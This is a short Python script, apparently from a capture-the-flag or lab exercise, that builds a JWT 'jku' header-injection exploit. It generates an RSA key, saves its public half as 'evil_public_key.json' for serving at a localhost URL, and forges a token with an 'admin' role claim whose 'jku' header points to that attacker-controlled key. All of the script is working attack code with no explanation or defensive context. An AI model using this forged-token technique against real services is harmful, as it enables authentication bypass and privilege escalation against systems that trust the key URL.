from jwcrypto import jwk, jwt
import json

url = "http://localhost:1337/public_key"
gen_key = jwk.JWK.generate(kty="RSA", size=2048)
public = json.loads(gen_key.export_public())
public["use"] = "sig"
public["kid"] = "MyKey"
public["alg"] = "RS256"
full_key = {"keys": [public]}
with open("evil_public_key.json", "w") as keyfile:
    keyfile.write(json.dumps(full_key))

newtoken = jwt.JWT(
    header={"alg": "RS256", "jku": url},
    claims={"role": "admin"},
)
newtoken.make_signed_token(gen_key)
print("Generated token:", newtoken.serialize())